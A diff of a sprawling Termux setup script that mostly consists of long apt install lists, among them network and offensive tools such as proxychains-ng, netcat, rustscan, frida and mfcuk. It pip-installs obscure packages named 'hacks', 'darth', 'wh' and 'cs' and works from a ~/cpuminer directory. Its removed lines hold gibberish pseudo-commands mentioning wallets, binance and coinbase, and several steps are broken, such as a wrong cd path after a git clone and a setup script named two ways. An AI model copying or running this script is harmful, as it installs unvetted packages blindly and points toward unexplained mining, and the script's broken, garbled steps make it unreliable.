-apt install -y abook agate age angband ansifilter apt-ftparchive arturo asciidoc attr barcode bc-gh boxes bsd-games busybox byobu c-script cabextract catdoc ccextractor chafa clifm clvk coreutils ctags d8 datamash deutex dex2jar dialog dmagnetic dos2unix dte dx e2fsprogs e2tools elinks elvish emacs enscript esbuild exercism exhale exiftool exiv2 expect fastmod fatsort figlet finch flex flex-static frp fte gawk gdbm gettext gettext-static gexiv2 git-lfs gitflow-avh grex groff groonga harfbuzz harfbuzz-icu helix hexcurse hexedit hexer hexyl hilbish html2text hugo hz icoutils influxdb innoextract ired jack-example-tools jhead joe jove jupp kbd kcptun kibi ldns less lexbor lexter libandroid-complex-math libandroid-execinfo libandroid-execinfo-static libandroid-wordexp libandroid-wordexp-static libbluray-utils libcaca libccd libebml libexif libexif-static libexpat libexpat-static libfcl libfinalcut libfreexl libfreexl-static libgnt libhyphen libice libimagequant libimtui liblog4c libmpc libmuparser libnettle libnewt libosl libphysfs libpipeline libraqm libre2 libregexp-assemble-perl librime librttopo libsoldout libspatialindex libspatialite libspeex libspeex-static libt3highlight libtool libtsduck libuber-h3 libucontext libucontext-static libxcfun libxext libxext-static libxfixes libxi libxls libxlsxwriter libxrandr libxrender libxss libxtst links lipl llvm locustdb lrzip lsd lua51 lua52 lua53 lua54 lynx media-types micro miller morse2ascii mp3cat mu nano ncurses ne neovim newsboat notmuch nsnake o-editor ocrad odt2txt onigmo oniguruma oorexx oorexx-static openexr pango parallel pass-otp patchelf pcre pcre2 pcre2grep pcregrep pdfgrep perl-rename pgroonga php-imagick php-psr php-redis php-zephir-parser pkgfile plantuml poke postgis proxychains-ng ptex ptex-static pueue qhull radare2 ragel rdrview re2c recoll recutils rgbds rnr ruby-ri ruff rush screen sed shell2http shellinabox sops speex-utils speexdsp speexdsp-static sqlcipher srt2vobsub ssdeep starship tcsh tectonic tere termux-exec tex-gyre texinfo texlab texlive-bin texlive-bin-static texlive-installer tig tilde tintin++ tinyfugue tmate tmux toilet translate-shell unar unrar unshield up update-info-dir upx uv vale vamp-plugin-sdk vobsub2srt vtm vulkan-extension-layer w3m wakatime-cli wasmedge watchexec wdiff weechat xxhash zk
+apt install -y abook agate age angband ansifilter apt-ftparchive arturo asciidoc attr barcode bc-gh boxes bsd-games busybox byobu c-script cabextract catdoc ccextractor chafa clifm clvk coreutils ctags d8 datamash deutex dex2jar dialog dmagnetic dos2unix dte dx e2fsprogs e2tools elinks elvish emacs enscript esbuild exercism exhale exiftool exiv2 expect fastmod fatsort figlet finch flex flex-static frp fte gawk gdbm gettext gettext-static gexiv2 git-lfs gitflow-avh grex groff groonga harfbuzz harfbuzz-icu helix hexcurse hexedit hexer hexyl hilbish html2text hugo hz icoutils influxdb innoextract ired jack-example-tools jhead joe jove jupp kbd kcptun kibi ldns less lexbor lexter libandroid-complex-math libandroid-execinfo libandroid-execinfo-static libandroid-wordexp libandroid-wordexp-static libbluray-utils libcaca libccd libebml libexif libexif-static libexpat libexpat-static libfcl libfinalcut libfreexl libfreexl-static libgnt libhyphen libice libimagequant libimtui liblog4c libmpc libmuparser libnettle libnewt libosl libphysfs libpipeline libraqm libre2 libregexp-assemble-perl librime librttopo libsoldout libspatialindex libspatialite libspeex libspeex-static libt3highlight libtool libtsduck libuber-h3 libucontext libucontext-static libxcfun libxext libxext-static libxfixes libxi libxls libxlsxwriter libxrandr libxrender libxss libxtst links lipl llvm locustdb lrzip lsd lua51 lua52 lua53 lua54 lynx media-types micro miller morse2ascii mp3cat mu nano ncurses ne neovim newsboat notmuch nsnake o-editor ocrad odt2txt onigmo oniguruma oorexx oorexx-static openexr pango parallel pass-otp patchelf pcre pcre2 pcre2grep pcregrep pdfgrep perl-rename pgroonga php-imagick php-psr php-redis php-zephir-parser plantuml poke postgis proxychains-ng ptex ptex-static pueue qhull radare2 ragel rdrview re2c recoll recutils rgbds rnr ruby-ri ruff rush screen sed shell2http shellinabox sops speex-utils speexdsp speexdsp-static sqlcipher srt2vobsub ssdeep starship tcsh tectonic tere termux-exec tex-gyre texinfo texlab texlive-bin texlive-bin-static texlive-installer tig tilde tintin++ tinyfugue tmate tmux toilet translate-shell unar unrar unshield up update-info-dir upx uv vale vamp-plugin-sdk vobsub2srt vtm vulkan-extension-layer w3m wakatime-cli wasmedge watchexec wdiff weechat xxhash zk
 
 apt update
 apt upgrade
 apt update
-apt install -y aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static valgrind valgrind-static asciidoc gbt geth gnugo go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
-echo -e "ip==open --sys(system)default.blockchain.ntl(eth0.*::/$*=(binance,coinbase,wallet,gas.fee.aptitude.//-0/#:)--12#$$#\[%])::" 
+apt install -y aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static valgrind valgrind-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
 pkg in build-essential -y
 apt install -y aptitude toilet figlet cowsay ruby python-pip python3 php doxygen resolv-conf automake flex yasm urdfdom telegram-bot-api robotfindskitten libotr-static libotr libdart libbullet botan3-static botan3 libwv libtiledb libxslt python-lxml python-libsass sassc speexdsp ssdeep-static libacl libao libarchive libasio libasm libasm-static libass libass-static libassuan libatomic-ops
 apt update
-echo "6/12)-*0*;1.1//@///#/$*/*"
 apt upgrade -y 
 pip install wheel beautifulsoup4 colorama requests telethon pytz pyaes proxy.py
 
@@ -994,7 +1431,7 @@ apt install -y imlib2-static libebml libexpat libhtmlcxx libhtmlcxx-static
 
 apt install -y id3lib imlib2 ipcalc iperf3 json-glib
 
-apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libgnutls libnewt libolm libtreesitter
+apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libnewt libolm libtreesitter
 
 apt install -y libdvbcsa libdvbpsi libvbisam tvheadend vbindiff ocl-icd octave opencl-clhpp opencl-headers opencl-vendor-driver openethereum outfieldr pastebinit peaclock
 
@@ -1092,7 +1529,4697 @@ apt install -y panda3d pygobject pystring python-apsw python-bcrypt python-ensur
 apt install -y python-grpcio python-libsass python-lxml python-numpy python-pillow python-pyarrow python-sabyenc3 python-torch python-torchaudio ruff vim-python weechat-matrix-rs weechat-python-plugin
 apt install -y nmap-ncat odt2txt oh-my-posh sse2neon lsd
 
-apt install -y aalib apr apr-util base16384 bitcoin boost brook busybox cuetools db dnstop dx fdisk fossil gdbm geoip2-database gkermit glulxe gobang guile18 influxdb kcptun libass libatomic-ops libdb libduckdb libduktape libfdisk libffi libhiredis libimagequant libiodbc libkokkos liblightning liblzo libmariadbcpp libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm locustdb microsocks miller monetdb natpmpc ngircd osm2pgsql patchelf pcaudiolib pforth phpmyadmin portaudio postgis postgresql python-bcrypt ragel recutils redis sfeed shtool sqlcipher ssdb unicode-data upx usql utf8cpp uthash yq tk 
+apt install -y aalib apr apr-util base16384 bitcoin boost brook busybox cuetools db dnstop dx fdisk fossil gdbm geoip2-database gkermit glulxe gobang guile18 influxdb kcptun libass libatomic-ops libdb libduckdb libduktape libfdisk libffi libhiredis libimagequant libkokkos liblightning liblzo libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm locustdb microsocks miller monetdb natpmpc ngircd osm2pgsql patchelf pcaudiolib pforth phpmyadmin portaudio postgis postgresql python-bcrypt ragel recutils redis sfeed shtool sqlcipher ssdb unicode-data upx usql utf8cpp uthash yq tk 
+
+apt install -y capstone-static
+
+apt install -y boost-static
+
+apt install -y bison-static
+apt install -y antibody atuin autoconf autoconf213 b3sum bash bash-completion beanshell cicada clifm command-not-found coreutils csh cuetools dialog direnv docbook-xsl duckdb eltclsh elvish et etsh fish gdrive-downloader gum hilbish hstr jo jump libcue libfreexl libgts mcfly mdns-scan mksh mosh mypaint-brushes n-t-roff-sc navi nushell oh-my-posh oleo openssh parallel rcshell sc-im sfeed sharutils shc sheldon shell2http shellcheck shellharden shellinabox shfmt shtool spark sqlite ssdeep starship surfraw tasksh tcsh termux-exec translate-shell unpaper wgetpaste which whiptail zsh zssh
+apt install -y 6tunnel angle-grinder at-spi2-core avahi blk-utils clinfo clpeak cryptsetup dtc eigen ethtool flyctl gitea gogs hz ices ipmitool iw libblkid libccid libcoap libcryptsetup libdevmapper libdrm libice libice-static libimobiledevice libimobiledevice-glue libimobiledevice-glue-static libimobiledevice-static libnss libsecret libshout libspeex libspice-protocol libspice-server libspice-server-static libusb libusbmuxd libusbredir libv4l libwolfssl lvm2 matterircd mdns-scan megacmd miniupnpc mkp224o mtd-utils ngspice pb pciutils pick thrift usbmuxd v4l-utils wavemon z-push glm libwslay llvm-mingw-w64-libcompiler-rt
+
+cd ~
+git clone https://github.com/termux/termux-packages.git
+cd /termux-packages/scripts
+bash setup-termux.sh 
+cd ~
+cd ~/cpuminer
+apt install -y python-bcrypt mosh whois ansifilter python-cryptography appstream apt-ftparchive arp-scan astra-sm barcode bdsup2sub bgrep binaryen brook ccrypt ceu-lang curseofwar debootstrap deutex difftastic distcc dnsmasq dopewars dvdauthor enscript frida gecode git gluelang gst-libav gst-plugins-bad gst-plugins-base gst-plugins-gl-headers gst-plugins-good gst-plugins-ugly gst-python gstreamer hcl hstr hz icecast ices ipfs ipset jigdo liba52 libasm libasm-static libcoap libcpufeatures libde265 libgee libgsf libisl libmaa libnova libosmpbf libphysfs libsasl libsoundtouch libstrophe libstrophe-static libt3widget libt3window libtalloc libtsduck libunistring libunistring-static libx264 libx265 libzix logrotate memcached minizinc mp3cat navidrome nushell osm2pgsql osmctools profanity proot-distro pystring python-libsass python-lxml qhull redis rtmpdump rubberband sed stag step-cli stfl strace streamripper termux-gui-pm texlive-bin tizonia tsmuxer ttf-dejavu tvheadend v2ray valgrind vde2 vgmstream vulkan-headers matplotlib gocryptfs keybase libbcprov-java libcrypt libcryptsetup libcryptsetup-static libdvbcsa libgcrypt libgcrypt-static libksba libmcrypt libmcrypt-static libnettle libolm libotr libsodium libtomcrypt libtomcrypt-static mbedtls nettle
+
+apt install -y mono
+apt install -y mtr
+
+apt install -y net-snmp
+apt install -y net-snmp-static
+apt install -y net-tools
+
+apt install -y netcat-openbsd
+
+apt install -y netcdf-c
+
+apt install -y netcdf-c-static
+
+python3 -m pip install pycore
+python3 -m pip install docker
+python3 -m pip install wh
+python3 -m pip install cs
+python3 -m pip install rsa
+python3 -m pip install rust
+python3 -m pip install net
+python3 -m pip install wget
+cd ~
+git clone https://github.com/termux/termux-packages.git
+cd /termux-packages/scripts
+bash termux-setup.sh 
+cd ~
+cd ~/cpuminer
+
+python3 -m pip install verify
+
+
+apt install -y libmp3splt
+apt install -y libmp3splt-static
+
+apt install -y libnspr
+
+apt install -y libnspr-static
+
+apt install -y liboggz
+
+apt install -y libopencore-amr
+
+apt install -y libosl
+apt install -y librav1e
+
+apt install -y libspatialindex
+apt install -y libspatialite
+apt install -y libspatialite-static
+
+apt install -y libspdlog
+apt install -y libspectre
+
+apt install -y libspectre-static
+
+apt install -y libspeex
+apt install -y libspeex-static
+apt install -y libspice-protocol
+
+apt install -y libspice-server
+
+apt install -y libspice-server-static
+
+apt install -y libsrt
+
+apt install -y libtiledb
+apt install -y libtirpc
+
+apt install -y libtsduck
+apt install -y libuber-h3
+
+apt install -y libxdg-basedir
+
+apt install -y libxdmcp
+apt install -y libyaml-cpp
+
+apt install -y libzimg
+apt install -y litespeedtest
+apt install -y lua-lgi
+apt install -y mapserver
+apt install -y markdown-flashcards
+
+apt install -y maxcso
+
+apt install -y mesa
+apt install -y mesa-vulkan-icd-freedreno-dri3
+
+apt install -y mp3splt
+
+apt install -y n-t-roff-sc
+apt install -y ncspot
+
+apt install -y neocmakelsp
+
+apt install -y ngspice
+
+apt install -y ninja
+apt install -y ninvaders
+apt install -y obfs4proxy
+apt install -y ol
+apt install -y oleo
+
+apt install -y openbabel
+apt install -y openexr
+
+apt install -y ossp-uuid
+apt install -y ossp-uuid-static
+apt install -y passphrase2pgp
+apt install -y peaclock
+apt install -y photon-rss
+apt install -y picolisp
+apt install -y pipewire
+apt install -y postgis
+apt install -y profanity
+apt install -y python-torchvision
+
+apt install -y qrsspig
+apt install -y racket
+apt install -y rav1e
+
+apt install -y rubberband-ladspa
+apt install -y rust
+apt install -y rw
+
+apt install -y sc-im
+apt install -y sensible-utils
+apt install -y slashtime
+apt install -y snowflake
+apt install -y snowflake-client
+
+apt install -y snowflake-proxy
+apt install -y sourcekit-lsp
+apt install -y spark
+apt install -y spatialite-tools
+apt install -y speechd
+
+apt install -y speechd-data
+apt install -y speedtest-go
+apt install -y speex-utils
+apt install -y speexdsp
+
+apt install -y speexdsp-static
+
+apt install -y spglib
+
+apt install -y spglib-static
+apt install -y spiped
+
+apt install -y spirv-headers
+apt install -y spirv-tools
+
+apt install -y streamripper
+apt install -y suitesparse
+apt install -y suitesparse-static
+
+apt install -y sysprop
+
+apt install -y taplo
+apt install -y task-spooler
+apt install -y tin-summer
+apt install -y toilet
+apt install -y tsmuxer
+
+apt install -y tsocks
+apt install -y tut
+
+apt install -y typst-lsp
+
+apt install -y uftrace
+apt install -y vale
+apt install -y watchexec
+apt install -y wdiff
+
+apt install -y whiptail
+apt install -y whitebox-tools
+apt install -y wuzz
+apt install -y xtrans
+
+apt install -y zellij
+apt install -y zzuf
+apt install -y lowdown
+
+apt install -y lowdown-static
+
+apt install -y lrzip
+
+apt install -y lsof-static
+
+apt install -y ltrace
+
+apt install -y lua-lgi
+
+apt install -y lua-lpeg
+
+apt install -y lua51-lpeg
+
+apt install -y lua52-lpeg
+
+apt install -y lua53-lpeg
+
+apt install -y luarocks
+
+apt install -y luv
+
+apt install -y lux
+
+apt install -y lv2
+
+apt install -y lzip
+apt install -y lzlib
+
+apt install -y lzlib-static
+
+apt install -y mailutils
+
+apt install -y mailutils-static
+apt install -y manpages
+
+apt install -y mariadb
+
+apt install -y mariadb-static
+
+apt install -y marisa
+
+apt install -y marisa-static
+
+apt install -y markdown-flashcards
+apt install -y matplotlib
+
+apt install -y maven
+
+apt install -y mbedtls
+
+apt install -y mbedtls-static
+
+apt install -y mcfly
+
+
+apt install -y mdp
+
+apt install -y media-types
+
+apt install -y megatools
+
+apt install -y mercury-static
+apt install -y mfcuk
+
+apt install -y miller
+apt install -y mimetic
+apt install -y mimetic-static
+
+apt install -y minidlna
+
+apt install -y minimodem
+apt install -y miniupnpc
+
+apt install -y miniupnpc-static
+
+apt install -y minizinc-static
+
+apt install -y mono-libs
+apt install -y mono-static
+
+apt install -y moon-buggy
+
+apt install -y moreutils
+
+apt install -y most
+
+apt install -y mp3wrap
+apt install -y mpd-static
+apt install -y mpg123
+
+apt install -y mpg123-static
+
+apt install -y mruby-static
+apt install -y mu
+
+apt install -y mupdf
+apt install -y mupdf-static
+
+apt install -y n2n
+apt install -y natpmpc-static
+apt install -y ncompress
+
+apt install -y ncurses
+
+apt install -y ncurses-static
+
+apt install -y ncurses-ui-libs
+apt install -y ncurses-ui-libs-static
+
+apt install -y ndk-multilib
+apt install -y ndk-multilib-native-stubs
+
+apt install -y ndk-sysroot
+apt install -y net-snmp
+
+apt install -y net-snmp-static
+
+apt install -y netcat-openbsd
+
+apt install -y netcdf-c
+
+apt install -y netcdf-c-static
+
+apt install -y netsed
+
+apt install -y nlopt
+
+apt install -y notcurses
+apt install -y notmuch
+
+apt install -y npush
+
+apt install -y oathtool-static
+
+apt install -y ocrad
+
+apt install -y ocrad-static
+
+apt install -y octave
+
+apt install -y octave-static
+
+apt install -y octomap-static
+apt install -y oniguruma
+
+apt install -y oniguruma-static
+
+apt install -y oorexx-static
+
+apt install -y open-adventure
+
+apt install -y openal-soft
+
+apt install -y opencolorio-static
+apt install -y opencv
+
+apt install -y openfoam
+apt install -y openjpeg
+
+apt install -y openjpeg-tools
+
+apt install -y openldap-static
+apt install -y openmpi-static
+apt install -y openssl
+apt install -y openssl-1.1
+
+apt install -y openssl-1.1-static
+
+apt install -y openssl-static
+
+apt install -y opusfile-static
+apt install -y osmesa
+
+apt install -y osmium-tool
+apt install -y ossp-uuid-static
+
+apt install -y ovmf
+apt install -y p7zip
+
+apt install -y pacman
+
+apt install -y panda3d-static
+
+apt install -y pandoc
+
+apt install -y pango
+apt install -y paperkey
+apt install -y par2
+
+apt install -y parallel
+
+apt install -y pari
+
+apt install -y pari-static
+apt install -y parted
+
+apt install -y parted-static
+
+apt install -y paruz
+apt install -y pcal
+
+apt install -y pcaudiolib
+apt install -y pcaudiolib-static
+
+apt install -y pcre
+
+apt install -y pcre-static
+
+apt install -y pcre2
+apt install -y pcre2-static
+
+apt install -y pcre2grep
+
+apt install -y pcregrep
+
+apt install -y pdfgrep
+
+apt install -y php-zephir-parser
+
+apt install -y pianobar
+
+apt install -y pick
+
+apt install -y pigz
+
+apt install -y pingme
+
+apt install -y pipebuffer
+
+apt install -y plzip
+
+apt install -y poke
+apt install -y poke-static
+apt install -y polyml
+
+apt install -y polyml-static
+
+apt install -y pomodoro-curses
+apt install -y poppler
+
+apt install -y portaudio
+apt install -y portaudio-static
+
+apt install -y portmidi
+
+apt install -y postgresql-static
+apt install -y potrace-static
+
+apt install -y procps-static
+apt install -y proj
+
+apt install -y protobuf-dev
+
+apt install -y protobuf-static
+
+apt install -y proxmark3
+
+apt install -y ptex-static
+
+apt install -y pulseaudio-glib-static
+
+apt install -y pure-ftpd
+
+apt install -y pycairo
+
+apt install -y pygobject
+
+apt install -y python
+
+apt install -y python-bcrypt
+
+apt install -y python-contourpy
+
+apt install -y python-lameenc
+
+apt install -y python-libsass
+apt install -y python-lxml
+apt install -y python-numpy-static
+apt install -y python-pillow
+
+apt install -y python-pyarrow
+apt install -y python-skia-pathops
+
+apt install -y python-static
+
+apt install -y python-torch-static
+
+apt install -y python-xlib
+
+apt install -y python2
+
+apt install -y python2-static
+
+apt install -y pzstd
+
+apt install -y qalc-static
+
+apt install -y qemu-system-aarch64-headless
+
+apt install -y qemu-system-arm-headless
+
+apt install -y qemu-system-x86-64-headless-static
+
+apt install -y qemu-user-aarch64
+
+apt install -y qemu-user-arm
+
+apt install -y qhull-static
+apt install -y qpdf-static
+
+apt install -y qrupdate-ng
+
+apt install -y quilt
+
+apt install -y racket-static
+apt install -y radare2
+
+apt install -y radare2-static
+apt install -y ragel
+
+apt install -y ragel-static
+
+apt install -y range-v3
+
+apt install -y rapidjson
+
+apt install -y ravencoin
+
+apt install -y ravencoin-static
+
+apt install -y rbw
+
+apt install -y readline
+
+apt install -y readline-static
+apt install -y recode
+
+apt install -y recode-static
+apt install -y recoll
+
+apt install -y recoll-static
+apt install -y recutils
+apt install -y recutils-static
+
+apt install -y remind
+apt install -y reptyr
+
+apt install -y rhash-static
+
+apt install -y ripgrep
+
+apt install -y ripgrep-all
+
+apt install -y rlwrap
+
+apt install -y rnr
+
+apt install -y rtmpdump-static
+
+apt install -y rubberband
+
+apt install -y rubberband-static
+apt install -y runit-static
+
+apt install -y rush
+apt install -y rust-bindgen
+apt install -y rust-std-aarch64-linux-android
+
+apt install -y rust-std-armv7-linux-androideabi
+apt install -y rust-std-i686-linux-android
+
+apt install -y rust-std-wasm32-unknown-unknown
+
+apt install -y rust-std-wasm32-wasi
+
+apt install -y rust-std-wasm32-wasip1
+
+apt install -y rust-std-wasm32-wasip2
+
+apt install -y rust-std-x86-64-linux-android
+
+apt install -y rustscan
+apt install -y sabnzbd
+apt install -y scala
+apt install -y scdaemon
+
+apt install -y scrypt
+apt install -y sdcv
+
+apt install -y seafile-client
+
+apt install -y seafile-client-static
+
+apt install -y serd
+
+apt install -y serf
+
+apt install -y serf-static
+
+apt install -y sfeed
+
+apt install -y shaderc
+
+apt install -y sharutils
+
+apt install -y shellharden
+
+apt install -y shellinabox
+
+apt install -y shfmt
+
+apt install -y shiori
+apt install -y silicon
+
+apt install -y silversearcher-ag
+
+apt install -y simh
+apt install -y slashtime
+
+apt install -y sleuthkit
+
+apt install -y sleuthkit-static
+
+apt install -y smalltalk-static
+
+apt install -y solidity
+
+apt install -y sord
+
+apt install -y sox
+
+apt install -y sox-static
+
+apt install -y spark
+
+apt install -y speexdsp
+
+apt install -y speexdsp-static
+
+apt install -y spglib
+
+apt install -y spglib-static
+
+apt install -y sqlcipher-static
+
+apt install -y squashfs-tools-ng-static
+
+apt install -y sratom
+
+apt install -y ssdeep-static
+
+apt install -y sse2neon
+
+apt install -y sshping
+
+apt install -y ssss
+apt install -y stag
+
+apt install -y starship
+
+apt install -y stfl
+
+apt install -y stfl-static
+
+apt install -y stoken
+apt install -y stoken-static
+
+apt install -y stow
+apt install -y stunnel
+
+apt install -y stunnel-static
+apt install -y subversion
+
+apt install -y subversion-perl-static
+
+apt install -y subversion-static
+
+apt install -y suil
+apt install -y suitesparse
+
+apt install -y suitesparse-static
+
+apt install -y sundials
+
+apt install -y sundials-static
+
+apt install -y surfraw
+
+apt install -y swaks
+
+apt install -y swi-prolog
+
+apt install -y swift-runtime-aarch64
+apt install -y swift-runtime-arm
+apt install -y swift-runtime-x86-64
+apt install -y swift-sdk-aarch64
+apt install -y swift-sdk-arm
+
+apt install -y swtpm
+
+apt install -y swtpm-static
+
+apt install -y ta-lib
+
+apt install -y ta-lib-static
+
+apt install -y taglib
+
+apt install -y tar
+apt install -y tasksh
+apt install -y taskwarrior
+apt install -y tcl
+apt install -y tcllib
+apt install -y teckit
+
+apt install -y teckit-static
+apt install -y tergent
+apt install -y termux-api-static
+apt install -y termux-auth
+apt install -y termux-gui-bash
+apt install -y termux-gui-c
+apt install -y termux-gui-pm
+
+apt install -y teseq
+
+apt install -y texlive-bin
+apt install -y texlive-bin-static
+
+apt install -y texlive-installer
+apt install -y tidy-static
+
+apt install -y timewarrior
+apt install -y tin-summer
+
+apt install -y tmate
+
+apt install -y toilet
+
+apt install -y tome2
+
+apt install -y toml11
+
+apt install -y torsocks-static
+
+apt install -y totem-pl-parser
+apt install -y tree-sitter-lua
+apt install -y tree-sitter-lua-static
+apt install -y tree-sitter-markdown
+
+apt install -y tree-sitter-markdown-static
+apt install -y tree-sitter-query
+
+apt install -y tree-sitter-query-static
+
+apt install -y tree-sitter-vimdoc
+
+apt install -y tree-sitter-vimdoc-static
+apt install -y trurl
+
+apt install -y trzsz-go
+
+apt install -y tsmuxer
+
+apt install -y tsocks
+
+apt install -y ttf-dejavu
+
+apt install -y ttyd
+
+apt install -y tur-repo
+
+apt install -y typst
+
+apt install -y uchardet
+
+apt install -y unar
+
+apt install -y unbound-static
+
+apt install -y unicode-data
+
+apt install -y unicorn
+
+apt install -y unicorn-static
+
+
+
+apt install -y unrar
+apt install -y unshield
+apt install -y urdfdom
+apt install -y urdfdom-headers
+
+apt install -y utf8proc
+
+apt install -y utf8proc-static
+
+apt install -y util-linux-static
+
+apt install -y uucp
+
+apt install -y valac-static
+
+apt install -y valadoc-static
+apt install -y vale
+apt install -y valgrind-static
+
+apt install -y vamp-plugin-sdk-static
+
+apt install -y vbindiff
+
+apt install -y vde2-static
+
+apt install -y vgmstream
+
+apt install -y vtm
+apt install -y vulkan-loader
+apt install -y vulkan-utility-libraries
+
+apt install -y wabt
+
+apt install -y wasmedge-static
+apt install -y webp-pixbuf-loader
+
+apt install -y weggli
+apt install -y wget2-static
+apt install -y wireguard-tools
+
+apt install -y wiz
+
+apt install -y wordgrinder
+apt install -y wrk
+
+apt install -y wtfutil
+
+apt install -y x11-repo
+
+apt install -y xapian-tools
+
+apt install -y xdelta3
+apt install -y xmlsec
+apt install -y xmlsec-static
+
+apt install -y xmlstarlet
+
+apt install -y xtrans
+
+apt install -y xvidcore
+
+apt install -y xvidcore-static
+
+apt install -y xxhash-static
+
+apt install -y yajl
+
+apt install -y yajl-static
+
+apt install -y yara
+
+apt install -y yara-static
+apt install -y yarn
+
+apt install -y yasm-static
+apt install -y yuma123-static
+apt install -y z3
+
+apt install -y zbar
+
+apt install -y zbar-static
+
+apt install -y zipios
+
+apt install -y zlib
+apt install -y zlib-static
+
+apt install -y zpaq
+
+apt install -y zrok
+
+apt install -y zstd
+apt install -y zstd-static
+
+apt install -y zziplib
+apt install -y zzuf
+
+apt install -y zzuf-static
+
+apt install -y aalib-static
+apt install -y giflib-static
+
+apt install -y giflib-utils
+
+apt install -y glib-bin
+
+apt install -y glib-cross
+
+apt install -y glib-networking
+
+apt install -y htslib-static
+apt install -y id3lib-static
+
+apt install -y lzlib-static
+apt install -y ndk-multilib-native-static
+
+apt install -y ndk-multilib-native-stubs
+
+apt install -y pcaudiolib-static
+
+apt install -y pulseaudio-glib-static
+
+apt install -y spglib-static
+
+apt install -y ta-lib-static
+
+apt install -y zlib-static
+
+apt install -y liblz4
+
+apt install -y liblzma
+
+apt install -y liblzma-static
+
+apt install -y liblzo
+
+apt install -y liblzo-static
+
+apt install -y libmaa
+
+apt install -y libmaa-static
+
+apt install -y libmad
+
+apt install -y libmad-static
+
+apt install -y libmatio
+
+apt install -y libmatroska
+
+apt install -y libmaxminddb
+
+apt install -y libmaxminddb-static
+
+apt install -y libmaxminddb-tools
+
+apt install -y libmcrypt
+
+apt install -y libmcrypt-static
+
+apt install -y libmd
+
+apt install -y libmd-static
+
+
+apt install -y libmediainfo
+
+apt install -y libmediainfo-static
+
+apt install -y libmesode
+
+apt install -y libmesode-static
+
+apt install -y libmhash
+
+apt install -y libmhash-static
+
+apt install -y libmicrohttpd
+
+apt install -y libmicrohttpd-static
+
+apt install -y libminizip
+apt install -y libminizip-static
+
+apt install -y libmnl
+
+apt install -y libmnl-static
+
+apt install -y libmodplug-static
+
+apt install -y libmosquitto
+apt install -y libmount
+
+apt install -y libmp3lame-static
+
+apt install -y libmp3splt
+
+apt install -y libmp3splt-static
+
+apt install -y libmpc
+
+apt install -y libmpc-static
+
+apt install -y libmpdclient
+
+apt install -y libmpeg2
+
+apt install -y libmpeg2-static
+
+apt install -y libmpfr
+apt install -y libmpfr-static
+
+apt install -y libmsgpack
+
+apt install -y libmsgpack-cxx
+
+apt install -y libmsgpack-static
+
+apt install -y libmuparser
+
+apt install -y libmusicbrainz
+
+apt install -y libmypaint
+
+apt install -y libmypaint-static
+
+apt install -y libnats-c
+
+apt install -y libnats-c-static
+
+apt install -y libncnn-static
+
+apt install -y libneon-static
+
+apt install -y libnet
+
+apt install -y libnet-static
+
+apt install -y libnettle
+
+apt install -y libnettle-static
+
+apt install -y libnewt
+
+apt install -y libnewt-static
+
+apt install -y libnfc-static
+
+apt install -y libnfs
+
+apt install -y libnfs-static
+
+apt install -y libnftnl
+
+apt install -y libnftnl-static
+
+apt install -y libnghttp2-static
+
+apt install -y libnghttp3-static
+
+apt install -y libnl
+
+apt install -y libnl-cli
+
+apt install -y libnl-cli-static
+
+apt install -y libnl-static
+
+apt install -y libnova
+
+apt install -y libnova-static
+
+apt install -y libnpth
+
+apt install -y libnpth-static
+
+apt install -y libnspr
+
+apt install -y libnspr-static
+
+apt install -y libnss
+
+apt install -y libntl-static
+apt install -y libobjc2
+
+apt install -y libode
+
+apt install -y libogg-static
+
+apt install -y liboggz
+
+apt install -y liboggz-static
+apt install -y libopenblas
+
+apt install -y libopenblas-static
+
+apt install -y libopencc
+apt install -y libopencore-amr
+
+apt install -y libopencore-amr-static
+
+apt install -y libopenfec
+
+apt install -y libopenmpt
+
+apt install -y libopenmpt-static
+
+apt install -y libopus
+
+apt install -y libopus-static
+
+apt install -y libopusenc
+
+apt install -y libopusenc-static
+
+apt install -y liborc
+
+apt install -y libosl
+
+apt install -y libosl-static
+
+apt install -y libosmium
+
+apt install -y libosmpbf
+
+apt install -y libosmpbf-static
+
+apt install -y libotr
+
+apt install -y libotr-static
+
+apt install -y libp8-platform
+
+apt install -y libpagmo
+
+apt install -y libpano13
+
+apt install -y libpano13-static
+
+apt install -y libpaper
+
+apt install -y libpaper-static
+
+apt install -y libpcap-static
+
+apt install -y libpcreposix
+
+apt install -y libphysfs
+
+apt install -y libpipeline
+
+apt install -y libpipeline-static
+
+apt install -y libpixman-static
+
+apt install -y libplacebo
+
+apt install -y libplist
+
+apt install -y libplist-static
+
+apt install -y libpluto
+
+apt install -y libpng-static
+
+apt install -y libpngwriter
+
+apt install -y libpngwriter-static
+
+apt install -y libpoco
+
+apt install -y libpopt
+
+apt install -y libpopt-static
+
+apt install -y libprotobuf
+
+apt install -y libprotobuf-c
+
+apt install -y libprotobuf-c-static
+
+apt install -y libprotozero
+
+apt install -y libpsl
